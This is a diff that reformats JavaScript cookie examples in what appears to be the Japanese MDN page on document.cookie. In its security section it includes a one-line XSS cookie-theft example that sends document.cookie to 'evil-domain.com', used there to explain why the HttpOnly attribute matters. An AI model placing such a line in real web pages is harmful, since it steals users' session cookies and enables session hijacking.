@@ -85,9 +85,9 @@ document.cookie = "test1=Hello";
 document.cookie = "test2=World";
 
 const cookieValue = document.cookie
-  .split('; ')
-  .find(row => row.startsWith('test2'))
-  .split('=')[1];
+  .split("; ")
+  .find((row) => row.startsWith("test2"))
+  .split("=")[1];
 
 function alertCookieValue() {
   alert(cookieValue);
@@ -106,9 +106,15 @@ function alertCookieValue() {
 
 ```js
 function doOnce() {
-  if (document.cookie.replace(/(?:(?:^|.*;\s*)doSomethingOnlyOnce\s*\=\s*([^;]*).*$)|^.*$/, "$1") !== "true") {
+  if (
+    document.cookie.replace(
+      /(?:(?:^|.*;\s*)doSomethingOnlyOnce\s*\=\s*([^;]*).*$)|^.*$/,
+      "$1",
+    ) !== "true"
+  ) {
     alert("Do something here!");
-    document.cookie = "doSomethingOnlyOnce=true; expires=Fri, 31 Dec 9999 23:59:59 GMT";
+    document.cookie =
+      "doSomethingOnlyOnce=true; expires=Fri, 31 Dec 9999 23:59:59 GMT";
   }
 }
 ```
@@ -123,7 +129,8 @@ function doOnce() {
 
 ```js
 function resetOnce() {
-  document.cookie = "doSomethingOnlyOnce=; expires=Thu, 01 Jan 1970 00:00:00 GMT";
+  document.cookie =
+    "doSomethingOnlyOnce=; expires=Thu, 01 Jan 1970 00:00:00 GMT";
 }
 ```
 
@@ -138,16 +145,20 @@ function resetOnce() {
 ```js
 //ES5
 
-if (document.cookie.split(';').some(function(item) {
-    return item.trim().indexOf('reader=') == 0
-})) {
-    console.log('The cookie "reader" exists (ES5)')
+if (
+  document.cookie.split(";").some(function (item) {
+    return item.trim().indexOf("reader=") == 0;
+  })
+) {
+  console.log('The cookie "reader" exists (ES5)');
 }
 
 //ES2016
 
-if (document.cookie.split(';').some((item) => item.trim().startsWith('reader='))) {
-    console.log('The cookie "reader" exists (ES6)')
+if (
+  document.cookie.split(";").some((item) => item.trim().startsWith("reader="))
+) {
+  console.log('The cookie "reader" exists (ES6)');
 }
 ```
 
@@ -156,16 +167,18 @@ if (document.cookie.split(';').some((item) => item.trim().startsWith('reader='))
 ```js
 //ES5
 
-if (document.cookie.split(';').some(function(item) {
-    return item.indexOf('reader=1') >= 0
-})) {
-    console.log('The cookie "reader" has "1" for value')
+if (
+  document.cookie.split(";").some(function (item) {
+    return item.indexOf("reader=1") >= 0;
+  })
+) {
+  console.log('The cookie "reader" has "1" for value');
 }
 
 //ES2016
 
-if (document.cookie.split(';').some((item) => item.includes('reader=1'))) {
-    console.log('The cookie "reader" has "1" for value')
+if (document.cookie.split(";").some((item) => item.includes("reader=1"))) {
+  console.log('The cookie "reader" has "1" for value');
 }
 ```
 
@@ -176,7 +189,8 @@ if (document.cookie.split(';').some((item) => item.includes('reader=1'))) {
 クッキーは普段、ウェブアプリケーションでユーザーと認証されたセッションを識別するために使われます。そこで、ウェブアプリケーションからのクッキーを盗まれると、認証されたユーザーのセッションハイジャックにつながります。クッキーを盗むための一般的な方法は、ソーシャルエンジニアリングを使用するか、アプリケーション内の XSS 脆弱性の悪用です。
 
 ```js
-(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
+new Image().src =
+  "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
 ```
 
 `HTTPOnly` クッキー属性は、 JavaScript からのクッキー値へのアクセスを防止することで、この攻撃を軽減することに役立ちます。より詳細情報は [Cookies and Security](http://www.nczonline.net/blog/2009/05/12/cookies-and-security/) を見てください。
